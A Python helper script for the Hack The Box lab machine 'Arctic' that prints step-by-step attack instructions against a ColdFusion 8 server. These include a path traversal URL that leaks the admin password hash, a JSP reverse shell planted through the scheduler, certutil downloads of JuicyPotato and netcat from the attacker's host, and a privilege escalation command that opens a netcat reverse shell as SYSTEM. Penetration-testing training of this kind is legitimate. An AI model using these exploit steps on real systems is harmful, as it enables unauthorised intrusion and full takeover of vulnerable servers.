import sys, os, subprocess
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Arctic
    __________________________________________________________________________\n"""
    print(Fore.RED + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] www-data", "[+] root", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.11" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://10.10.10.11:8500/CFIDE/administrator/");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked BoardLight Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
  
def undected():
    try:
        print(Fore.YELLOW+f"\t\t==================================================================================")
        print(Fore.YELLOW+f"\t\tthis machine is too slow to automate the process, the following process is manual.")
        print(Fore.YELLOW+f"\t\t==================================================================================")
        cm.sleep(3)
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","www-data connection"))
                print(tmsg,Fore.CYAN +f"[www-data Message] > " + Fore.LIGHTCYAN_EX + f"Path Exploit: http://{target_machine}/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en")
                print(tmsg,Fore.CYAN +f"[www-data Message] > " + Fore.LIGHTMAGENTA_EX + f"✔ Password for login decrypted: happyday")
                #commands_send(f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={machine_ip} LPORT=443 -o reverse.jsp") 
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data File] > " + Fore.WHITE + f"✔ reverse.jsp file created.")
                print(tmsg,Fore.YELLOW +f"[www-data Path-Execute] > " + Fore.YELLOW + f"Path Exploit: http://{target_machine}/CFIDE/administrator/scheduler/scheduleedit.cfm?submit=Schedule+New+Task")
                print(tmsg,Fore.YELLOW +f"[www-data Command] > " + Fore.GREEN + f"Enter data for new task: \n\n» Task name > Pwned\n» URL > http://{machine_ip}/reverse.jsp\n» Publish > Checked\n» File > C:\ColdFusion8\wwwroot\CFIDE\\reverse.jsp\n")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data Listen] > " + Fore.BLUE + f"Please listen http port > python3 -m http.server 80")
                print(tmsg,Fore.YELLOW +f"[www-data Path-Execute] > " + Fore.MAGENTA + f"Run task on > http://{target_machine}:8500/CFIDE/administrator/index.cfm")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data Listen] > " + Fore.BLUE + f"Please listen on port 443 for RCE connection.")
                print(tmsg,Fore.YELLOW +f"[www-data RCE-Shell] > " + Fore.MAGENTA + f"Click here: http://{target_machine}:8500/CFIDE/reverse.jsp")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","root-Arctic user connection"))
                print(tmsg,Fore.CYAN +f"[root-user Message] > " + Fore.LIGHTCYAN_EX + f"Download: https://github.com/ohpe/juicy-potato/releases/tag/v0.1")
                print(tmsg,Fore.CYAN +f"[root-user Message] > " + Fore.LIGHTCYAN_EX + f"Download 2: https://eternallybored.org/misc/netcat/")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Listen] > " + Fore.BLUE + f"Please listen http port > python3 -m http.server 80")
                print(tmsg,Fore.YELLOW +f"[root-user RCE-Win] > " + Fore.MAGENTA + f"cd C:\\Windows\Temp")
                print(tmsg,Fore.YELLOW +f"[root-user RCE-Win] > " + Fore.MAGENTA + f"mkdir Privesc")
                print(tmsg,Fore.YELLOW +f"[root-user RCE-Win] > " + Fore.MAGENTA + f"certutil.exe -f -urlcache -split http://{machine_ip}:443/JuicyPotato.exe")
                print(tmsg,Fore.YELLOW +f"[root-user RCE-Win] > " + Fore.MAGENTA + f"certutil.exe -f -urlcache -split http://{machine_ip}:443/nc.exe")                
                print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Listen] > " + Fore.BLUE + f"Please listen on port 4646")
                print(tmsg,Fore.YELLOW +f"[root-user RCE-Win] > " + Fore.MAGENTA + f'.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\\nc.exe -e cmd {machine_ip} 4646"')
                print(tmsg,Fore.CYAN +f"[root-user Message] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
